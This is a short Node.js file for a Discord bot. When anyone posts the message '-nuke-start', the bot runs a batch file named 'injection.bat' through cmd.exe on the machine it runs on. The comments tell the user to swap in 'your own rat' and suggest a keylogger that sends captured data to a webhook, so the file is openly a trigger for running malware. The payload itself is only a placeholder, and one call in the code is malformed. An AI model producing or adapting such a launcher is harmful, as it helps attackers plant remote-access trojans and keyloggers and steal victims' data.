const Discord = require('discord.js'); //discord.js v12 !!! Uninstall discord js with :   npm uninstall discord.js  and reinstall it with npm i discord.js
const bot = new Discord.Client();

var spawn = require('child_process').spawn

bot.on('message', function(message) {
    if(message.content === "-nuke-start") {
        spawn('cmd.exe',  ['/c', 'injection.bat']).stdout.on()
        //Replace "injection.bat" with your own rat or other script.
        //You can send make key logger or other script and send things to webhook or other...
    }
})

bot.login("TOKEN_OF_BOT");